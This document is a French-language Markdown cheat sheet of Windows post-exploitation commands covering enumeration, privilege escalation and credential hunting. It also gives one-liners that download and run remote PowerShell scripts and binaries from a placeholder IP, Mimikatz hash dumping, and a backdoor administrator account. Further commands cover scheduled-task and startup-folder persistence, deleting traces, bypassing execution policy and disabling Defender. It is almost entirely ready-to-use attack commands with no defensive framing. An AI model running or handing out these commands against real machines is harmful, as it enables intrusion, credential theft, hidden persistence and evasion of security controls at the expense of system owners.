# 🪟 Post-Exploitation Windows - Cheatsheet Cyber

Ce fichier regroupe les **commandes essentielles** pour la **post-exploitation sous Windows**, incluant **l’élévation de privilèges**, **la persistance**, et **l’exfiltration d’informations**.

---

## 🔍 1. Enumération système

systeminfo  
> Affiche la version Windows, les correctifs, la RAM, etc.

hostname  
> Nom de la machine

whoami  
> Utilisateur courant

whoami /priv  
> Liste des privilèges de l'utilisateur

ipconfig /all  
> Détails réseau (interfaces, DNS, IP)

net users  
> Liste les utilisateurs locaux

net user NOM  
> Infos sur un utilisateur précis

net localgroup administrators  
> Affiche les membres du groupe Administrateurs

tasklist  
> Liste des processus en cours

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
> Version rapide de l'OS

---

## 🔐 2. Élévation de privilèges

### 🔎 Rechercher des failles locales

- Vérifie si l’utilisateur a des droits d’administrateur.
- Utilise des outils comme `winPEAS.exe` ou `Seatbelt.exe`.

Exemples :

winPEASany.exe  
> Enumération automatique des failles

icacls "C:\Program Files\VulnApp"  
> Vérifie les droits sur un répertoire vulnérable

dir /s /b "C:\*.exe" | findstr /i "Program Files"  
> Cherche les binaire exécutables dans des chemins contrôlables

---

## 🛠 3. Prise de contrôle / commande à distance

### 📡 Téléchargement de fichiers depuis la machine cible

powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\Public\file.exe')"  
> Télécharge un fichier distant

certutil -urlcache -f http://IP/file.exe file.exe  
> Téléchargement via certutil (pratique si PowerShell est restreint)

### 🚀 Exécution de commande PowerShell

powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"  
> Télécharge & exécute un script PowerShell à la volée

---

## 🧠 4. Informations sensibles

### 🔐 Mots de passe, token, hash

reg query "HKLM\SYSTEM\CurrentControlSet\Services\VSS\Diag" /s  
> Peut contenir des credentials (rare mais utile)

findstr /si password *.txt *.xml *.ini  
> Cherche des mots de passe dans les fichiers

dir C:\ /s /b | findstr /i "keepass config pass secret"  
> Recherche fichiers sensibles

### 🗝 Dump de hash

Utilise `mimikatz` ou `lsass` dump via PowerShell (si Admin) :

Invoke-Mimikatz.ps1  
> Lancer mimikatz depuis PowerShell

---

## ♻️ 5. Persistance

### 🪛 Ajout d’un utilisateur admin

net user hacker P@ssword123 /add  
net localgroup administrators hacker /add

### 📁 Démarrage automatique

Copier un binaire dans :

C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

### 📅 Planification de tâche

schtasks /create /tn "UpdateCheck" /tr "C:\payload.exe" /sc minute /mo 5  
> Crée une tâche planifiée qui s’exécute toutes les 5 minutes

---

## 🧹 6. Nettoyage

del payload.exe  
del script.ps1  
del /f /q %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe  
> Supprime les traces

---

## 🛡 7. Bypass & défense

### 🔄 Bypass AMSI (exécution de PowerShell bloquée)

powershell -w hidden -nop -ep bypass  
> Contourne les politiques d’exécution

### 🛡 Disable Defender (si possible)

powershell Set-MpPreference -DisableRealtimeMonitoring $true  
> Désactive Defender (si droits suffisants)

---

## 📌 Ressources utiles

- [PayloadsAllTheThings - Windows](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [LOLBAS project](https://lolbas-project.github.io/)
- [winPEAS](https://github.com/carlospolop/PEASS-ng)

